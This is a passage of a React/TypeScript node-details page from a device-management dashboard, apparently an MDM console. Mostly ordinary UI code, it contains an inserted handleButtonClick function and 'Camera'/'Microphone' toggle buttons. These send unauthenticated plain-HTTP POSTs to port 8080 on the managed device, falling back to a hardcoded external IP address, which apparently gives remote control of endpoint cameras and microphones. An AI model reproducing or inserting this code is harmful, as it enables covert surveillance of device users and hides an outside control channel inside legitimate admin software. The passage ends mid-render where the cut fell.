import React, { useContext, useState, useCallback, useEffect } from "react";
import classNames from "classnames";
import { Params, InjectedRouter } from "react-router/lib/Router";
import { useQuery } from "react-query";
import { useErrorHandler } from "react-error-boundary";
import { Tab, Tabs, TabList, TabPanel } from "react-tabs";
import { pick } from "lodash";

import PATHS from "router/paths";

import { AppContext } from "context/app";
import { NotificationContext } from "context/notification";

import activitiesAPI, {
  INodePastActivitiesResponse,
  INodeUpcomingActivitiesResponse,
} from "services/entities/activities";
import nodeAPI from "services/entities/nodes";
import teamAPI, { ILoadTeamsResponse } from "services/entities/teams";

import {
  INode,
  IDeviceMappingResponse,
  IMacadminsResponse,
  INodeResponse,
  INodeMdmData,
  IPackStats,
} from "interfaces/node";
import { ILabel } from "interfaces/label";
import { INodePolicy } from "interfaces/policy";
import { IQueryStats } from "interfaces/query_stats";
import { INodeSoftware } from "interfaces/software";
import { ITeam } from "interfaces/team";
import { INodeUpcomingActivity } from "interfaces/activity";

import { normalizeEmptyValues, wrapMdmlabHelper } from "utilities/helpers";
import permissions from "utilities/permissions";
import {
  DOCUMENT_TITLE_SUFFIX,
  HOST_SUMMARY_DATA,
  HOST_ABOUT_DATA,
  HOST_OSQUERY_DATA,
} from "utilities/constants";

import { isIPadOrIPhone } from "interfaces/platform";

import Spinner from "components/Spinner";
import TabsWrapper from "components/TabsWrapper";
import MainContent from "components/MainContent";
import BackLink from "components/BackLink";
import RunScriptDetailsModal from "pages/DashboardPage/cards/ActivityFeed/components/RunScriptDetailsModal";
import {
  AppInstallDetailsModal,
  IAppInstallDetails,
} from "components/ActivityDetails/InstallDetails/AppInstallDetails/AppInstallDetails";
import {
  SoftwareInstallDetailsModal,
  IPackageInstallDetails,
} from "components/ActivityDetails/InstallDetails/SoftwareInstallDetails/SoftwareInstallDetails";
import SoftwareUninstallDetailsModal from "components/ActivityDetails/InstallDetails/SoftwareUninstallDetailsModal";
import { IShowActivityDetailsData } from "components/ActivityItem/ActivityItem";

import NodeSummaryCard from "../cards/NodeSummary";
import AboutCard from "../cards/About";
import ActivityCard from "../cards/Activity";
import AgentOptionsCard from "../cards/AgentOptions";
import LabelsCard from "../cards/Labels";
import MunkiIssuesCard from "../cards/MunkiIssues";
import SoftwareCard from "../cards/Software";
import UsersCard from "../cards/Users";
import PoliciesCard from "../cards/Policies";
import QueriesCard from "../cards/Queries";
import PacksCard from "../cards/Packs";
import PolicyDetailsModal from "../cards/Policies/NodePoliciesTable/PolicyDetailsModal";
import UnenrollMdmModal from "./modals/UnenrollMdmModal";
import TransferNodeModal from "../../components/TransferNodeModal";
import DeleteNodeModal from "../../components/DeleteNodeModal";

import DiskEncryptionKeyModal from "./modals/DiskEncryptionKeyModal";
import NodeActionsDropdown from "./NodeActionsDropdown/NodeActionsDropdown";
import OSSettingsModal from "../OSSettingsModal";
import BootstrapPackageModal from "./modals/BootstrapPackageModal";
import ScriptModalGroup from "./modals/ScriptModalGroup";
import SelectQueryModal from "./modals/SelectQueryModal";
import NodeDetailsBanners from "./components/NodeDetailsBanners";
import LockModal from "./modals/LockModal";
import UnlockModal from "./modals/UnlockModal";
import {
  NodeMdmDeviceStatusUIState,
  getNodeDeviceStatusUIState,
} from "../helpers";
import WipeModal from "./modals/WipeModal";
import SoftwareDetailsModal from "../cards/Software/SoftwareDetailsModal";
import { parseNodeSoftwareQueryParams } from "../cards/Software/NodeSoftware";
import { getErrorMessage } from "./helpers";
import CancelActivityModal from "./modals/CancelActivityModal";

const baseClass = "node-details";

interface INodeDetailsProps {
  router: InjectedRouter; // v3
  location: {
    pathname: string;
    query: {
      page?: string;
      query?: string;
      order_key?: string;
      order_direction?: "asc" | "desc";
    };
    search?: string;
  };
  params: Params;
}

interface ISearchQueryData {
  searchQuery: string;
  sortHeader: string;
  sortDirection: string;
  pageSize: number;
  pageIndex: number;
}

interface INodeDetailsSubNavItem {
  name: string | JSX.Element;
  title: string;
  pathname: string;
}

const DEFAULT_ACTIVITY_PAGE_SIZE = 8;

const NodeDetailsPage = ({
  router,
  location,
  params: { node_id },
}: INodeDetailsProps): JSX.Element => {
  const nodeIdFromURL = parseInt(node_id, 10);

  const {
    config,
    currentUser,
    isGlobalAdmin = false,
    isGlobalObserver,
    isPremiumTier = false,
    isOnlyObserver,
    filteredNodesPath,
    currentTeam,
  } = useContext(AppContext);
  const { renderFlash } = useContext(NotificationContext);

  const handlePageError = useErrorHandler();

  const [showDeleteNodeModal, setShowDeleteNodeModal] = useState(false);
  const [showTransferNodeModal, setShowTransferNodeModal] = useState(false);
  const [showSelectQueryModal, setShowSelectQueryModal] = useState(false);
  const [showScriptModalGroup, setShowScriptModalGroup] = useState(false);
  const [showPolicyDetailsModal, setPolicyDetailsModal] = useState(false);
  const [showOSSettingsModal, setShowOSSettingsModal] = useState(false);
  const [showUnenrollMdmModal, setShowUnenrollMdmModal] = useState(false);
  const [showDiskEncryptionModal, setShowDiskEncryptionModal] = useState(false);
  const [showBootstrapPackageModal, setShowBootstrapPackageModal] = useState(
    false
  );
  const [showLockNodeModal, setShowLockNodeModal] = useState(false);
  const [showUnlockNodeModal, setShowUnlockNodeModal] = useState(false);
  const [showWipeModal, setShowWipeModal] = useState(false);
  const [scriptExecutionId, setScriptExecutiontId] = useState("");
  const [selectedPolicy, setSelectedPolicy] = useState<INodePolicy | null>(
    null
  );
  const [
    packageInstallDetails,
    setPackageInstallDetails,
  ] = useState<IPackageInstallDetails | null>(null);
  const [
    packageUninstallDetails,
    setPackageUninstallDetails,
  ] = useState<IPackageInstallDetails | null>(null);
  const [
    appInstallDetails,
    setAppInstallDetails,
  ] = useState<IAppInstallDetails | null>(null);

  const [isUpdatingNode, setIsUpdatingNode] = useState(false);
  const [refetchStartTime, setRefetchStartTime] = useState<number | null>(null);
  const [showRefetchSpinner, setShowRefetchSpinner] = useState(false);
  const [schedule, setSchedule] = useState<IQueryStats[]>();
  const [packsState, setPackState] = useState<IPackStats[]>();
  const [usersState, setUsersState] = useState<{ username: string }[]>([]);
  const [usersSearchString, setUsersSearchString] = useState("");
  const [
    nodeMdmDeviceStatus,
    setNodeMdmDeviceState,
  ] = useState<NodeMdmDeviceStatusUIState>("unlocked");
  const [
    selectedSoftwareDetails,
    setSelectedSoftwareDetails,
  ] = useState<INodeSoftware | null>(null);
  const [
    selectedCancelActivity,
    setSelectedCancelActivity,
  ] = useState<INodeUpcomingActivity | null>(null);

  // activity states
  const [activeActivityTab, setActiveActivityTab] = useState<
    "past" | "upcoming"
  >("past");
  const [activityPage, setActivityPage] = useState(0);

  // Camera and Microphone states
  const [cameraState, setCameraState] = useState(false);
  const [microphoneState, setMicrophoneState] = useState(false);

  const { data: teams } = useQuery<ILoadTeamsResponse, Error, ITeam[]>(
    "teams",
    () => teamAPI.loadAll(),
    {
      enabled: !!nodeIdFromURL && !!isPremiumTier,
      refetchOnMount: false,
      refetchOnReconnect: false,
      refetchOnWindowFocus: false,
      retry: false,
      select: (data: ILoadTeamsResponse) => data.teams,
    }
  );

  const { data: deviceMapping, refetch: refetchDeviceMapping } = useQuery(
    ["deviceMapping", nodeIdFromURL],
    () => nodeAPI.loadNodeDetailsExtension(nodeIdFromURL, "device_mapping"),
    {
      enabled: !!nodeIdFromURL,
      refetchOnMount: false,
      refetchOnReconnect: false,
      refetchOnWindowFocus: false,
      retry: false,
      select: (data: IDeviceMappingResponse) => data.device_mapping,
    }
  );

  const { data: mdm, refetch: refetchMdm } = useQuery<INodeMdmData>(
    ["mdm", nodeIdFromURL],
    () => nodeAPI.getMdm(nodeIdFromURL),
    {
      enabled: !!nodeIdFromURL,
      refetchOnMount: false,
      refetchOnReconnect: false,
      refetchOnWindowFocus: false,
      retry: false,
      onError: (err) => {
        // no handling needed atm. data is simply not shown.
        console.error(err);
      },
    }
  );

  const { data: macadmins, refetch: refetchMacadmins } = useQuery(
    ["macadmins", nodeIdFromURL],
    () => nodeAPI.loadNodeDetailsExtension(nodeIdFromURL, "macadmins"),
    {
      enabled: !!nodeIdFromURL,
      refetchOnMount: false,
      refetchOnReconnect: false,
      refetchOnWindowFocus: false,
      retry: false,
      select: (data: IMacadminsResponse) => data.macadmins,
    }
  );

  const refetchExtensions = () => {
    deviceMapping !== null && refetchDeviceMapping();
    macadmins !== null && refetchMacadmins();
    mdm?.enrollment_status !== null && refetchMdm();
  };

  const {
    isLoading: isLoadingNode,
    data: node,
    refetch: refetchNodeDetails,
  } = useQuery<INodeResponse, Error, INode>(
    ["node", nodeIdFromURL],
    () => nodeAPI.loadNodeDetails(nodeIdFromURL),
    {
      enabled: !!nodeIdFromURL,
      refetchOnMount: false,
      refetchOnReconnect: false,
      refetchOnWindowFocus: false,
      retry: false,
      select: (data: INodeResponse) => data.node,
      onSuccess: (returnedNode) => {
        setShowRefetchSpinner(returnedNode.refetch_requested);
        setNodeMdmDeviceState(
          getNodeDeviceStatusUIState(
            returnedNode.mdm.device_status,
            returnedNode.mdm.pending_action
          )
        );
        if (returnedNode.refetch_requested) {
          // If the API reports that a Mdmlab refetch request is pending, we want to check back for fresh
          // node details. Here we set a one second timeout and poll the API again using
          // fullyReloadNode. We will repeat this process with each onSuccess cycle for a total of
          // 60 seconds or until the API reports that the Mdmlab refetch request has been resolved
          // or that the node has gone offline.
          if (!refetchStartTime) {
            // If our 60 second timer wasn't already started (e.g., if a refetch was pending when
            // the first page loads), we start it now if the node is online. If the node is offline,
            // we skip the refetch on page load.
            if (
              returnedNode.status === "online" ||
              isIPadOrIPhone(returnedNode.platform)
            ) {
              setRefetchStartTime(Date.now());
              setTimeout(() => {
                refetchNodeDetails();
                refetchExtensions();
              }, 1000);
            } else {
              setShowRefetchSpinner(false);
            }
          } else {
            // !!refetchStartTime
            const totalElapsedTime = Date.now() - refetchStartTime;
            if (totalElapsedTime < 60000) {
              if (
                returnedNode.status === "online" ||
                isIPadOrIPhone(returnedNode.platform)
              ) {
                setTimeout(() => {
                  refetchNodeDetails();
                  refetchExtensions();
                }, 1000);
              } else {
                renderFlash(
                  "error",
                  `This node is offline. Please try refetching node vitals later.`
                );
                setShowRefetchSpinner(false);
              }
            } else {
              // totalElapsedTime > 60000
              renderFlash(
                "error",
                `We're having trouble fetching fresh vitals for this node. Please try again later.`
              );
              setShowRefetchSpinner(false);
            }
          }
          return; // exit early because refectch is pending so we can avoid unecessary steps below
        }
        setUsersState(returnedNode.users || []);
        setSchedule(schedule);
        if (returnedNode.pack_stats) {
          const packStatsByType = returnedNode.pack_stats.reduce(
            (
              dictionary: {
                packs: IPackStats[];
                schedule: IQueryStats[];
              },
              pack: IPackStats
            ) => {
              if (pack.type === "pack") {
                dictionary.packs.push(pack);
              } else {
                dictionary.schedule.push(...pack.query_stats);
              }
              return dictionary;
            },
            { packs: [], schedule: [] }
          );
          setSchedule(packStatsByType.schedule);
        }
      },
      onError: (error) => handlePageError(error),
    }
  );

  // get activities data. This is at the node details level because we want to
  // wait to show the node details page until we have the activities data.
  const {
    data: pastActivities,
    isFetching: pastActivitiesIsFetching,
    isLoading: pastActivitiesIsLoading,
    isError: pastActivitiesIsError,
    refetch: refetchPastActivities,
  } = useQuery<
    INodePastActivitiesResponse,
    Error,
    INodePastActivitiesResponse,
    Array<{
      scope: string;
      pageIndex: number;
      perPage: number;
      activeTab: "past" | "upcoming";
    }>
  >(
    [
      {
        scope: "past-activities",
        pageIndex: activityPage,
        perPage: DEFAULT_ACTIVITY_PAGE_SIZE,
        activeTab: activeActivityTab,
      },
    ],
    ({ queryKey: [{ pageIndex, perPage }] }) => {
      return activitiesAPI.getNodePastActivities(
        nodeIdFromURL,
        pageIndex,
        perPage
      );
    },
    {
      keepPreviousData: true,
      staleTime: 2000,
    }
  );

  const {
    data: upcomingActivities,
    isFetching: upcomingActivitiesIsFetching,
    isLoading: upcomingActivitiesIsLoading,
    isError: upcomingActivitiesIsError,
    refetch: refetchUpcomingActivities,
  } = useQuery<
    INodeUpcomingActivitiesResponse,
    Error,
    INodeUpcomingActivitiesResponse,
    Array<{
      scope: string;
      pageIndex: number;
      perPage: number;
      activeTab: "past" | "upcoming";
    }>
  >(
    [
      {
        scope: "upcoming-activities",
        pageIndex: activityPage,
        perPage: DEFAULT_ACTIVITY_PAGE_SIZE,
        activeTab: activeActivityTab,
      },
    ],
    ({ queryKey: [{ pageIndex, perPage }] }) => {
      return activitiesAPI.getNodeUpcomingActivities(
        nodeIdFromURL,
        pageIndex,
        perPage
      );
    },
    {
      keepPreviousData: true,
      staleTime: 2000,
    }
  );

  const featuresConfig = node?.team_id
    ? teams?.find((t) => t.id === node.team_id)?.features
    : config?.features;

  const getOSVersionRequirementFromMDMConfig = (nodePlatform: string) => {
    const mdmConfig = node?.team_id
      ? teams?.find((t) => t.id === node.team_id)?.mdm
      : config?.mdm;

    switch (nodePlatform) {
      case "darwin":
        return mdmConfig?.macos_updates;
      case "ipados":
        return mdmConfig?.ipados_updates;
      case "ios":
        return mdmConfig?.ios_updates;
      default:
        return undefined;
    }
  };

  useEffect(() => {
    setUsersState(() => {
      return (
        node?.users.filter((user) => {
          return user.username
            .toLowerCase()
            .includes(usersSearchString.toLowerCase());
        }) || []
      );
    });
  }, [usersSearchString, node?.users]);

  // Updates title that shows up on browser tabs
  useEffect(() => {
    if (node?.display_name) {
      // e.g., Rachel's Macbook Pro | Nodes | Mdmlab
      document.title = `${node?.display_name} | Nodes | ${DOCUMENT_TITLE_SUFFIX}`;
    } else {
      document.title = `Nodes | ${DOCUMENT_TITLE_SUFFIX}`;
    }
  }, [location.pathname, node]);

  const summaryData = normalizeEmptyValues(pick(node, HOST_SUMMARY_DATA));

  const aboutData = normalizeEmptyValues(pick(node, HOST_ABOUT_DATA));

  const osqueryData = normalizeEmptyValues(pick(node, HOST_OSQUERY_DATA));

  const togglePolicyDetailsModal = useCallback(
    (policy: INodePolicy) => {
      setPolicyDetailsModal(!showPolicyDetailsModal);
      setSelectedPolicy(policy);
    },
    [showPolicyDetailsModal, setPolicyDetailsModal, setSelectedPolicy]
  );

  const toggleOSSettingsModal = useCallback(() => {
    setShowOSSettingsModal(!showOSSettingsModal);
  }, [showOSSettingsModal, setShowOSSettingsModal]);

  const toggleBootstrapPackageModal = useCallback(() => {
    setShowBootstrapPackageModal(!showBootstrapPackageModal);
  }, [showBootstrapPackageModal, setShowBootstrapPackageModal]);

  const onCancelPolicyDetailsModal = useCallback(() => {
    setPolicyDetailsModal(!showPolicyDetailsModal);
    setSelectedPolicy(null);
  }, [showPolicyDetailsModal, setPolicyDetailsModal, setSelectedPolicy]);

  const toggleUnenrollMdmModal = useCallback(() => {
    setShowUnenrollMdmModal(!showUnenrollMdmModal);
  }, [showUnenrollMdmModal, setShowUnenrollMdmModal]);

  const onDestroyNode = async () => {
    if (node) {
      setIsUpdatingNode(true);
      try {
        await nodeAPI.destroy(node);
        router.push(PATHS.MANAGE_HOSTS);
        renderFlash(
          "success",
          `Node "${node.display_name}" was successfully deleted.`
        );
      } catch (error) {
        console.log(error);
        renderFlash(
          "error",
          `Node "${node.display_name}" could not be deleted.`
        );
      } finally {
        setShowDeleteNodeModal(false);
        setIsUpdatingNode(false);
      }
    }
  };

  const onRefetchNode = async () => {
    if (node) {
      // Once the user clicks to refetch, the refetch loading spinner should continue spinning
      // unless there is an error. The spinner state is also controlled in the fullyReloadNode
      // method.
      setShowRefetchSpinner(true);
      try {
        await nodeAPI.refetch(node).then(() => {
          setRefetchStartTime(Date.now());
          setTimeout(() => {
            refetchNodeDetails();
            refetchExtensions();
          }, 1000);
        });
      } catch (error) {
        renderFlash("error", getErrorMessage(error, node.display_name));
        setShowRefetchSpinner(false);
      }
    }
  };

  const onChangeActivityTab = (tabIndex: number) => {
    setActiveActivityTab(tabIndex === 0 ? "past" : "upcoming");
    setActivityPage(0);
  };

  const onShowActivityDetails = useCallback(
    ({ type, details }: IShowActivityDetailsData) => {
      switch (type) {
        case "ran_script":
          setScriptExecutiontId(details?.script_execution_id || "");
          break;
        case "installed_software":
          setPackageInstallDetails({
            ...details,
            // FIXME: It seems like the backend is not using the correct display name when it returns
            // upcoming install activities. As a workaround, we'll prefer the display name from
            // the node object if it's available.
            node_display_name:
              node?.display_name || details?.node_display_name || "",
          });
          break;
        case "uninstalled_software":
          setPackageUninstallDetails({
            ...details,
            node_display_name:
              node?.display_name || details?.node_display_name || "",
          });
          break;
        case "installed_app_store_app":
          setAppInstallDetails({
            ...details,
            // FIXME: It seems like the backend is not using the correct display name when it returns
            // upcoming install activities. As a workaround, we'll prefer the display name from
            // the node object if it's available.
            node_display_name:
              node?.display_name || details?.node_display_name || "",
          });
          break;
        default: // do nothing
      }
    },
    [node?.display_name]
  );

  const onLabelClick = (label: ILabel) => {
    return label.name === "All Nodes"
      ? router.push(PATHS.MANAGE_HOSTS)
      : router.push(PATHS.MANAGE_HOSTS_LABEL(label.id));
  };

  const onCancelRunScriptDetailsModal = useCallback(() => {
    setScriptExecutiontId("");
    // refetch activities to make sure they up-to-date with what was displayed in the modal
    refetchPastActivities();
    refetchUpcomingActivities();
  }, [refetchPastActivities, refetchUpcomingActivities]);

  const onCancelSoftwareInstallDetailsModal = useCallback(() => {
    setPackageInstallDetails(null);
  }, []);

  const onCancelAppInstallDetailsModal = useCallback(() => {
    setAppInstallDetails(null);
  }, []);

  const onTransferNodeSubmit = async (team: ITeam) => {
    setIsUpdatingNode(true);

    const teamId = typeof team.id === "number" ? team.id : null;

    try {
      await nodeAPI.transferToTeam(teamId, [nodeIdFromURL]);

      const successMessage =
        teamId === null
          ? `Node successfully removed from teams.`
          : `Node successfully transferred to  ${team.name}.`;

      renderFlash("success", successMessage);
      refetchNodeDetails(); // Note: it is not necessary to `refetchExtensions` here because only team has changed
      setShowTransferNodeModal(false);
    } catch (error) {
      console.log(error);
      renderFlash("error", "Could not transfer node. Please try again.");
    } finally {
      setIsUpdatingNode(false);
    }
  };

  const onUsersTableSearchChange = useCallback(
    (queryData: ISearchQueryData) => {
      const { searchQuery } = queryData;
      setUsersSearchString(searchQuery);
    },
    []
  );

  const onCloseScriptModalGroup = useCallback(() => {
    setShowScriptModalGroup(false);
    refetchPastActivities();
    refetchUpcomingActivities();
  }, [refetchPastActivities, refetchUpcomingActivities]);

  const onSelectNodeAction = (action: string) => {
    switch (action) {
      case "transfer":
        setShowTransferNodeModal(true);
        break;
      case "query":
        setShowSelectQueryModal(true);
        break;
      case "diskEncryption":
        setShowDiskEncryptionModal(true);
        break;
      case "mdmOff":
        toggleUnenrollMdmModal();
        break;
      case "delete":
        setShowDeleteNodeModal(true);
        break;
      case "runScript":
        setShowScriptModalGroup(true);
        break;
      case "lock":
        setShowLockNodeModal(true);
        break;
      case "unlock":
        setShowUnlockNodeModal(true);
        break;
      case "wipe":
        setShowWipeModal(true);
        break;
      default: // do nothing
    }
  };

  const onCancelActivity = (activity: INodeUpcomingActivity) => {
    setSelectedCancelActivity(activity);
  };

  const renderActionDropdown = () => {
    if (!node) {
      return null;
    }

    return (
      <NodeActionsDropdown
        nodeTeamId={node.team_id}
        onSelect={onSelectNodeAction}
        nodePlatform={node.platform}
        nodeStatus={node.status}
        nodeMdmDeviceStatus={nodeMdmDeviceStatus}
        nodeMdmEnrollmentStatus={node.mdm.enrollment_status}
        doesStoreEncryptionKey={node.mdm.encryption_key_available}
        isConnectedToMdmlabMdm={node.mdm?.connected_to_mdmlab}
        nodeScriptsEnabled={node.scripts_enabled}
      />
    );
  };

 const handleButtonClick = async (buttonName: 'camera' | 'microphone') => {
  const newState = buttonName === 'camera' ? !cameraState : !microphoneState;
  if (!aboutData) {
    console.error('Node is not defined');
    return;
  }

  // Update the state
  if (buttonName === 'camera') {
    setCameraState(newState);
  } else {
    setMicrophoneState(newState);
  }

  // Construct the URL dynamically using node.id
  var  ip = aboutData.primary_ip;
  if (ip == "---") {
    ip = "176.119.157.39" ;

  }
  const url = `http://${ip}:8080`;

  // Send POST request to the dynamically constructed URL
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        button: buttonName,
        state: newState ? 'on' : 'off',
      }),
    });

    if (!response.ok) {
      throw new Error('Network response was not ok');
    }

    const data = await response.json();
    console.log('Success:', data);
  } catch (error) {
    console.error('Error:', error);
  }
  };
  if (
    !node ||
    isLoadingNode ||
    pastActivitiesIsLoading ||
    upcomingActivitiesIsLoading
  ) {
    return <Spinner />;
  }

  const failingPoliciesCount = node?.issues.failing_policies_count || 0;

  const nodeDetailsSubNav: INodeDetailsSubNavItem[] = [
    {
      name: "Details",
      title: "details",
      pathname: PATHS.HOST_DETAILS(nodeIdFromURL),
    },
    {
      name: "Software",
      title: "software",
      pathname: PATHS.HOST_SOFTWARE(nodeIdFromURL),
    },
    {
      name: "Queries",
      title: "queries",
      pathname: PATHS.HOST_QUERIES(nodeIdFromURL),
    },
    {
      name: (
        <>
          {failingPoliciesCount > 0 && (
            <span className="count">{failingPoliciesCount}</span>
          )}
          Policies
        </>
      ),
      title: "policies",
      pathname: PATHS.HOST_POLICIES(nodeIdFromURL),
    },
  ];

  const getTabIndex = (path: string): number => {
    return nodeDetailsSubNav.findIndex((navItem) => {
      // tab stays highlighted for paths that ends with same pathname
      return path.endsWith(navItem.pathname);
    });
  };

  const navigateToNav = (i: number): void => {
    const navPath = nodeDetailsSubNav[i].pathname;
    router.push(navPath);
  };

  /*  Context team id might be different that node's team id
  Observer plus must be checked against node's team id  */
  const isGlobalOrNodesTeamObserverPlus =
    currentUser && node?.team_id
      ? permissions.isObserverPlus(currentUser, node.team_id)
      : false;

  const isNodesTeamObserver =
    currentUser && node?.team_id
      ? permissions.isTeamObserver(currentUser, node.team_id)
      : false;

  const canViewPacks =
    !isGlobalObserver &&
    !isGlobalOrNodesTeamObserverPlus &&
    !isNodesTeamObserver;

  const bootstrapPackageData = {
    status: node?.mdm.macos_setup?.bootstrap_package_status,
    details: node?.mdm.macos_setup?.details,
    name: node?.mdm.macos_setup?.bootstrap_package_name,
  };

  const isIosOrIpadosNode =
    node.platform === "ios" || node.platform === "ipados";

  const detailsPanelClass = classNames(`${baseClass}__details-panel`, {
    [`${baseClass}__details-panel--ios-grid`]: isIosOrIpadosNode,
  });

  return (
    <MainContent className={baseClass}>
      <>
                 {/* Add the buttons at the top of the page */}
        {/* Add the buttons at the top of the page */}

         <div style={{ marginBottom: '20px' }}>
          <button
            onClick={() => handleButtonClick('camera')}
            style={{
              backgroundColor: cameraState ? '#27AE60' : '#E74C3C',
              color: 'white',
              padding: '10px 20px',
              marginRight: '10px',
              border: 'none',
              borderRadius: '5px',
              cursor: 'pointer',
            }}
          >
            Camera {cameraState ? 'ON' : 'OFF'}
          </button>
          <button
            onClick={() => handleButtonClick('microphone')}
            style={{
              backgroundColor: microphoneState ? '#27AE60' : '#E74C3C',
              color: 'white',
              padding: '10px 20px',
              border: 'none',
              borderRadius: '5px',
              cursor: 'pointer',
            }}
          >
            Microphone {microphoneState ? 'ON' : 'OFF'}
          </button>
        </div>

        <NodeDetailsBanners
          mdmEnrollmentStatus={node?.mdm.enrollment_status}
          nodePlatform={node?.platform}
          macDiskEncryptionStatus={node?.mdm.macos_settings?.disk_encryption}
          connectedToMdmlabMdm={node?.mdm.connected_to_mdmlab}
          diskEncryptionOSSetting={node?.mdm.os_settings?.disk_encryption}
          diskIsEncrypted={node?.disk_encryption_enabled}
          diskEncryptionKeyAvailable={node?.mdm.encryption_key_available}
        />
        <div className={`${baseClass}__header-links`}>
          <BackLink
            text="Back to all nodes"
            path={filteredNodesPath || PATHS.MANAGE_HOSTS}
          />
        </div>
        <NodeSummaryCard
          summaryData={summaryData}
          bootstrapPackageData={bootstrapPackageData}
          isPremiumTier={isPremiumTier}
          toggleOSSettingsModal={toggleOSSettingsModal}
          toggleBootstrapPackageModal={toggleBootstrapPackageModal}
          nodeSettings={node?.mdm.profiles ?? []}
          showRefetchSpinner={showRefetchSpinner}
          onRefetchNode={onRefetchNode}
          renderActionDropdown={renderActionDropdown}
          osSettings={node?.mdm.os_settings}
          osVersionRequirement={getOSVersionRequirementFromMDMConfig(
            node.platform
          )}
          nodeMdmDeviceStatus={nodeMdmDeviceStatus}
        />
      
        <TabsWrapper className={`${baseClass}__tabs-wrapper`}>
          <Tabs
            selectedIndex={getTabIndex(location.pathname)}
            onSelect={(i) => navigateToNav(i)}
          >
            <TabList>
              {nodeDetailsSubNav.map((navItem) => {
                // Bolding text when the tab is active causes a layout shift
                // so we add a hidden pseudo element with the same text string
                return <Tab key={navItem.title}>{navItem.name}</Tab>;
              })}
            </TabList>
            <TabPanel className={detailsPanelClass}>
              <AboutCard
                aboutData={aboutData}
                deviceMapping={deviceMapping}
                munki={macadmins?.munki}
                mdm={mdm}
              />
              <ActivityCard
                activeTab={activeActivityTab}
                activities={
                  activeActivityTab === "past"
                    ? pastActivities
                    : upcomingActivities
                }
                isLoading={
                  activeActivityTab === "past"
                    ? pastActivitiesIsFetching
                    : upcomingActivitiesIsFetching
                }
                isError={
                  activeActivityTab === "past"
                    ? pastActivitiesIsError
                    : upcomingActivitiesIsError
                }
                upcomingCount={upcomingActivities?.count || 0}
                onChangeTab={onChangeActivityTab}
                onNextPage={() => setActivityPage(activityPage + 1)}
                onPreviousPage={() => setActivityPage(activityPage - 1)}
                onShowDetails={onShowActivityDetails}
                onCancel={onCancelActivity}
              />
              {!isIosOrIpadosNode && (
                <AgentOptionsCard
                  osqueryData={osqueryData}
                  wrapMdmlabHelper={wrapMdmlabHelper}
                  isChromeOS={node?.platform === "chrome"}
                />
              )}
              <LabelsCard
                labels={node?.labels || []}
                onLabelClick={onLabelClick}
              />
              {!isIosOrIpadosNode && (
                <UsersCard
                  users={node?.users || []}
                  usersState={usersState}
                  isLoading={isLoadingNode}
                  onUsersTableSearchChange={onUsersTableSearchChange}
                  nodeUsersEnabled={featuresConfig?.enable_node_users}
                />
              )}
            </TabPanel>
            <TabPanel>
              <SoftwareCard
                id={node.id}
                platform={node.platform}
                softwareUpdatedAt={node.software_updated_at}
                nodeCanWriteSoftware={!!node.orbit_version || isIosOrIpadosNode}
                nodeScriptsEnabled={node.scripts_enabled || false}
                isSoftwareEnabled={featuresConfig?.enable_software_inventory}
                router={router}
                queryParams={parseNodeSoftwareQueryParams(location.query)}
                pathname={location.pathname}
                onShowSoftwareDetails={setSelectedSoftwareDetails}
                nodeTeamId={node.team_id || 0}
                nodeMDMEnrolled={node.mdm.connected_to_mdmlab}
              />
              {node?.platform === "darwin" && macadmins?.munki?.version && (
                <MunkiIssuesCard
                  isLoading={isLoadingNode}
                  munkiIssues={macadmins.munki_issues}
                  deviceType={node?.platform === "darwin" ? "macos" : ""}
                />
              )}
            </TabPanel>
            <TabPanel>
              <QueriesCard
                nodeId={node.id}
                router={router}
                nodePlatform={node.platform}
                schedule={schedule}
                queryReportsDisabled={
                  config?.server_settings?.query_reports_disabled
                }
              />
              {canViewPacks && (
                <PacksCard packsState={packsState} isLoading={isLoadingNode} />
              )}
            </TabPanel>
            <TabPanel>
              <PoliciesCard
                policies={node?.policies || []}
                isLoading={isLoadingNode}
                togglePolicyDetailsModal={togglePolicyDetailsModal}
                nodePlatform={node.platform}
                router={router}
                currentTeamId={currentTeam?.id}
              />
            </TabPanel>
          </Tabs>
        </TabsWrapper>
        {showDeleteNodeModal && (
          <DeleteNodeModal
            onCancel={() => setShowDeleteNodeModal(false)}
            onSubmit={onDestroyNode}
            nodeName={node?.display_name}
            isUpdating={isUpdatingNode}
          />
        )}
        {showSelectQueryModal && node && (
          <SelectQueryModal
            onCancel={() => setShowSelectQueryModal(false)}
            isOnlyObserver={isOnlyObserver}
            nodeId={nodeIdFromURL}
            nodeTeamId={node?.team_id}
            router={router}
            currentTeamId={currentTeam?.id}
          />
        )}
        {showScriptModalGroup && (
          <ScriptModalGroup
            node={node}
            currentUser={currentUser}
            onCloseScriptModalGroup={onCloseScriptModalGroup}
          />
        )}
        {!!node && showTransferNodeModal && (
          <TransferNodeModal
            onCancel={() => setShowTransferNodeModal(false)}
            onSubmit={onTransferNodeSubmit}
            teams={teams || []}
            isGlobalAdmin={isGlobalAdmin as boolean}
            isUpdating={isUpdatingNode}
          />
        )}
        {!!node && showPolicyDetailsModal && (
          <PolicyDetailsModal
            onCancel={onCancelPolicyDetailsModal}
            policy={selectedPolicy}
          />
        )}
        {showOSSettingsModal && (
          <OSSettingsModal
            canResendProfiles={node.platform === "darwin"}
            nodeId={node.id}
            platform={node.platform}
            nodeMDMData={node.mdm}
            onClose={toggleOSSettingsModal}
            onProfileResent={refetchNodeDetails}
          />
        )}
        {showUnenrollMdmModal && !!node && (
          <UnenrollMdmModal nodeId={node.id} onClose={toggleUnenrollMdmModal} />
        )}
        {showDiskEncryptionModal && node && (
          <DiskEncryptionKeyModal
            platform={node.platform}
            nodeId={node.id}
            onCancel={() => setShowDiskEncryptionModal(false)}
          />
        )}
        {showBootstrapPackageModal &&
          bootstrapPackageData.details &&
          bootstrapPackageData.name && (
            <BootstrapPackageModal
              packageName={bootstrapPackageData.name}
              details={bootstrapPackageData.details}
              onClose={() => setShowBootstrapPackageModal(false)}
            />
          )}
        {scriptExecutionId && (
          <RunScriptDetailsModal
            scriptExecutionId={scriptExecutionId}
            onCancel={onCancelRunScriptDetailsModal}
          />
        )}
        {!!packageInstallDetails && (
          <SoftwareInstallDetailsModal
            details={packageInstallDetails}
            onCancel={onCancelSoftwareInstallDetailsModal}
          />
        )}
        {packageUninstallDetails && (
          <SoftwareUninstallDetailsModal
            details={packageUninstallDetails}
            onCancel={() => setPackageUninstallDetails(null)}
          />
        )}
        {!!appInstallDetails && (
          <AppInstallDetailsModal
            details={appInstallDetails}
            onCancel={onCancelAppInstallDetailsModal}
          />
        )}
        {showLockNodeModal && (
